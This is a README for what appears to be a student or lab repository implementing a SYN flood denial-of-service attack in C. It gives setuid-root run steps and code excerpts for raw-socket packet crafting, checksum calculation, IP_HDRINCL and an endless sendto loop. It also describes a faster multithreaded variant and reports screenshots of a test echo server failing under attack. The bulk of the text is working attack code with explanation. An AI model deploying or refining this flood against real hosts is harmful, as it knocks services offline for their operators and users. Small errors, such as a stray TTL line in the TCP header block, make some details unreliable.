

The code is a basic implementation of a raw socket in C for a `SYN flood attack`, which is a type of `Denial-of-Service (DoS) attack`.


#################################################################################################################################
## How to run?
   To execute the `attack.c` file and initiate the attack, please follow these steps:

   $  `sudo chown root ./attack`
   $  `sudo chmod +s ./attack`
   $  .`./attack`

   To execute the `multi_thread_attack.c` file and initiate the attack, please follow these steps:

   $  `sudo chown root ./multi_thread_attack`
   $  `sudo chmod +s ./multi_thread_attack`
   $  .`./multi_thread_attack`
   
##################################################################################################################################

# Table of contents: 

   I-    **pseudo_header structure**
   II-   **Checksum Calculation Function**
   III-  **Main Function**
      1- **_Creating a raw socket_
      2- **_Set the IP header_
      3- **_Set the TCP header_
      4- **_Calculate the checksums_
      5- **_Set socket options_
      6- **_Enter a loop to send packets_
   IV-   **Multi-thread attack**
   V-    **Credits**
   VI-   **Screenshots**

#### Define a pseudo_header structure:
     
     =================================
    ||                               ||
    ||  typedef struct {             ||
    ||    unsigned int src_addr;     ||
    ||    unsigned int dest_addr;    ||
    ||    unsigned char reserved;    ||
    ||    unsigned char protocol_id; ||
    ||    unsigned short tcp_len;    ||
    ||    struct tcphdr tcp_struct;  ||
    ||  } pseudo_header;             ||
    ||                               ||
     =================================


#### Checksum Calculation Function:

This function calculates the checksum for the provided data.
    `unsigned short calc_checksum(unsigned short *data, int size) { /*...*/}`

## Main Function:
The main function is the entry point of the program.

Within `the main function`, several things are happening:

//  **Create a raw socket**: A raw socket is a type of internet socket that allows direct sending and receiving of Internet Protocol (IP) packets without any protocol-specific transport layer formatting.

  **Prepare the IP and TCP headers**: The IP header contains information about the IP version, source and destination IP addresses, etc. The TCP header contains information about the source and destination ports, sequence number, etc.

   **Set the IP header**: Fill in the various fields of the IP header, such as IP version, header length, total length, etc.

   **Set the TCP header**: Fill in the various fields of the TCP header, such as source port, destination port, sequence number, etc. The SYN flag is set to 1 because this is a SYN flood attack.

   **Calculate the checksums:** The checksums for the IP and TCP headers are calculated and set in their respective fields.

   **Set socket options**: The IP_HDRINCL option is set for the socket. This tells the kernel that the program provides the IP header.

   **Enter a loop to send packets**: In an infinite loop, the program randomizes the source port and recalculates the TCP header's checksum, and then it sends the packet using the sendto function. After each packet is sent, the program prints "Packet Send".


#### Creating a raw socket:

==> `int socket_fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);`

   **PF_INET**: This is the protocol family or domain, which in this case is the Internet Protocol v4. This tells the socket to use IPv4 for network communication.

   **SOCK_RAW**: This is the socket type. A raw socket is a socket that allows direct sending and receiving of Internet Protocol (IP) packets without any protocol-specific transport layer formatting. With raw sockets, the application layer takes on the responsibilities typically handled by the transport layer in the TCP/IP stack, like creating the packet header. This gives the application more control, but it also means the application has to do more work. This is necessary for certain types of network programs, like this one, which is constructing custom packets to conduct a SYN flood attack.(copy paste)

   **IPPROTO_TCP**: This is the protocol to be used with the socket, which is TCP in this case.


#### Set the IP header:
        
         =====================================================================================
        || struct iphdr *ip_header = (struct iphdr *) packet;                                ||
        ||                                                                                   ||
        || ip_header->ihl = 5;  // header length                                             ||
        || ip_header->version = 4; // IPv4                                                   ||
        || ip_header->tos = 0; // type of service                                            ||
        || ip_header->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); // total length ||
        || ip_header->id = htons(54321); // ID of this packet                                ||
        || ip_header->frag_off = 0; // fragment offset                                       ||
        || ip_header->ttl = 255; // time to live                                             ||
        || ip_header->protocol = IPPROTO_TCP; // protocol TCP                                ||
        || ip_header->check = 0; // set to 0 before calculating checksum                     ||
        || ip_header->saddr = inet_addr(src_ip); // source IP address                        ||
        || ip_header->daddr = server_addr.sin_addr.s_addr; // destination IP address         ||
         =====================================================================================

   **_ihl_**: This is the Internet Header Length. It represents the length of the IP header. This is usually 5, as the IP header is typically 20 bytes long, and the unit of measurement for ihl is 32-bit words.

   **_version_**: The version of IP being used. In this case, it's 4 (IPv4).

   **_tos_**: Type of Service. This field is used for Quality of Service (QoS) but is often zero.

   **_tot len_**: This is the total length of the IP datagram, which includes the IP header and the data. In this case, the data is the TCP header, so the total length is the size of the IP header plus the size of the TCP header.

   **_id_**: The ID of the packet. This is used for reassembling fragmented packets.

   **_frag off_**: The fragment offset. This is used when IP datagrams are fragmented into smaller packets. In this case, there's no fragmentation, so it's zero.

   **_ttl_**: The Time To Live. This value decreases by 1 each time the packet passes through a router. If it reaches zero, the packet is discarded. It's set high (255) to ensure the packet can pass through many routers without being discarded.

   **_protocol_**: The transport layer protocol. IPPROTO_TCP represents TCP.

   **_check_**: The checksum of the IP header. This is calculated later, so it's initially set to zero.

   **_saddr_**: The source IP address.

   **_daddr_**: The destination IP address.

#### Set the TCP header:

         ================================================================================
        || struct tcphdr *tcp_header = (struct tcphdr *) (packet + sizeof (struct ip)); ||
        ||                                                                              ||
        || tcp_header->source = htons (1234);                                           ||
        || tcp_header->dest = htons (80);                                               ||
        || tcp_header->seq = 0;                                                         ||
        || tcp_header->ack_seq = 0;                                                     ||
        || tcp_header->fin=0;                                                           ||
        || tcp_header->syn=1;                                                           ||
        || ip_header->ttl = 255; // time to live                                        ||
        || tcp_header->rst=0;                                                           ||
        || tcp_header->psh=0;                                                           ||
        || tcp_header->ack=0;                                                           ||
        || tcp_header->urg=0;                                                           ||
        || tcp_header->window = htons (5840); // maximum allowed window size            ||
        || tcp_header->check = 0; // set to 0 before calculating checksum               ||
        || tcp_header->urg_ptr = 0;                                                     ||
         ================================================================================


   **_source_**: The source port. This is set to a random value for each packet sent.

   **_dest_**: The destination port. This is typically 80 for HTTP traffic.

   **_seq_**: The sequence number. This is used by TCP to arrange received packets in the correct order.

   **_ack seq_**: The acknowledgement number. This is used by TCP to acknowledge received packets.

   **_doff_**: The data offset. This specifies the size of the TCP header. The unit of measurement is 32-bit words, so a value of 5 means the header is 20 bytes long (5*4).

   **_fin_**, **_syn_**, **_rst_**, **_psh_**, **_ack_**, **_urg_**: These are the control flags used by TCP. In a SYN flood attack, only the SYN flag is set because the goal is to send as many SYN (synchronize) packets as possible to the target.

   **_window_**: The size of the sliding window. This controls how much data can be sent at once without acknowledgement.

   **_check_**: The checksum of the TCP header. This is calculated later, so it's initially set to zero.

   **_urg ptr_**: This is the urgent pointer. It's not used here, so it's set to zero.

#### Calculate the checksums:

   **IP Checksum**

    ========================================================================================= 
   ||`ip_header->check = calc_checksum((unsigned short *) packet, ip_header->tot_len >> 1);`||
    =========================================================================================


This line of code calls the `calc_checksum` function with the packet data and the length of the packet as arguments. The length of the packet is divided by 2 because the checksum is calculated on _16-bit_ words. The result is stored in the check field of the IP header.

   **TCP Checksum**

         ============================================================================================
        || p_header.src_addr = inet_addr(src_ip);                                                   ||
        || p_header.dest_addr = server_addr.sin_addr.s_addr;                                        ||
        || p_header.reserved = 0;                                                                   ||
        || p_header.protocol_id = IPPROTO_TCP;                                                      ||
        || p_header.tcp_len = htons(20);                                                            ||
        ||                                                                                          ||
        || memcpy(&p_header.tcp_struct , tcp_header , sizeof(struct tcphdr));                       ||
        ||                                                                                          ||
        || tcp_header->check = calc_checksum((unsigned short*) &p_header, sizeof(pseudo_header_t)); ||
         ============================================================================================

** Calculating the `TCP checksum` is a bit more involved because it includes a "pseudo-header" that contains some fields from the IP header. The \ is used to detect corruption in the entire TCP segment.

** First, the fields of the pseudo-header are filled. The source and destination addresses are set to the same values as in the IP header. The protocol_id field is set to the TCP protocol number, and the tcp_len field is set to the size of the TCP header.

** Next, the TCP header is copied into the pseudo-header.

** Finally, the checksum is calculated using the `calc_checksum` function, similarly to the IP checksum, but this time the pseudo-header is used instead of the packet data. The result is stored in the check field of the TCP header.


#### Set socket options:

         ==============================================================================================================
        || int flag_val = 1;                                                                                          ||
        || const int *val_ptr = &flag_val;                                                                            ||
        || if (setsockopt (socket_fd, IPPROTO_IP, IP_HDRINCL, val_ptr, sizeof(flag_val)) < 0) {                       ||
        ||     printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));||
        ||     exit(0);                                                                                               ||
        || }                                                                                                          ||
         ==============================================================================================================

the option being set is `IP_HDRINCL`. The `IP_HDRINCL` option tells the kernel that the user application will provide the IP header for outgoing packets. This means that the application will manually construct the IP header for each packet it sends, giving the application greater control over the IP header fields.


#### Enter a loop to send packets:

             ============================================================================================================================
            || while (1) {                                                                                                              ||
            ||     tcp_header->check = 0;                                                                                               ||
            ||     tcp_header->source = htons(rand() + 1024);                                                                           ||
            ||                                                                                                                          ||
            ||     p_header.src_addr = inet_addr(src_ip);                                                                               ||
            ||     p_header.dest_addr = server_addr.sin_addr.s_addr;                                                                    ||  
            ||     p_header.reserved = 0;                                                                                               ||
            ||     p_header.protocol_id = IPPROTO_TCP;                                                                                  ||
            ||     p_header.tcp_len = htons(20);                                                                                        ||
            ||                                                                                                                          ||
            ||     memcpy(&p_header.tcp_struct , tcp_header , sizeof(struct tcphdr));                                                   ||
            ||                                                                                                                          ||
            ||     tcp_header->check = calc_checksum((unsigned short*) &p_header, sizeof(pseudo_header_t));                             ||
            ||                                                                                                                          ||
            ||     if (sendto(socket_fd, packet, ip_header->tot_len, 0, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {   ||
            ||         printf ("error\n");                                                                                              ||
            ||     } else {                                                                                                             ||
            ||         printf ("Packet Send \n");                                                                                       ||
            ||     }                                                                                                                    ||
            || }                                                                                                                        ||
             ============================================================================================================================

Packet Sending: The packet is sent using the sendto function, which sends the data to the specified destination. If there's an error in sending the packet, it prints "error". If the packet is sent successfully, it prints "Packet Send".

This process is repeated indefinitely due to the while(1) loop, thus flooding the target with SYN packets. Each packet is made to appear unique by using a different source port for each one.


## Multithread SYN Flood

This repository includes a multithreaded version of our code for performing SYN flood attacks. The implementation is straightforward and involves the following steps:

   ** Create a `send_packets` function, which is an exact copy of the main function from the attack.c file.
   ** Instantiate _N_THREADS_ threads, each responsible for sending its own packets.
   ** Since the threads do not share any data between them, they can work simultaneously.
   ** We have observed that the original attack.c implementation requires at least 15 seconds to take effect. However, the multithreaded version is significantly faster.



### Credits: 
** The code is highly inspired by : `http://www.cs.toronto.edu/~arnold/427/15s/csc427/indepth/syn-flooding/index.html` and `https://github.com/seifzadeh/c-network-programming-best-snipts/blob/master/SYN%20Flood%20DOS%20Attack%20with%20C%20Source%20Code%20(Linux)`

** Used some ideas from this video: `https://www.youtube.com/watch?v=M-zX_6FuFKg&pp=ygUSaXAgYW5kIHRjcCBoZWFkZXIg`


### Screenshots:

** `attack_terminal.JPG` is a screenshot of the terminal while executing `attack.c`
** `multi_thread_attack_terminal.JPG` is a screenshot of the terminal while executing `multi_thread_attack.c`
** `terminal_bedore_the_attack` is a screenshot that shows that the echo server does work before the attack
** `terminal_after_the_attack` is a screenshot that shows that the echo server does not work after the attack
** `tcpdump_before_the_attack` is a screenshot of tcpdump output (from the VM) before the attack.
** `tcpdump_after_the_attack` is a screenshot of tcpdump output (from the VM) after the attack.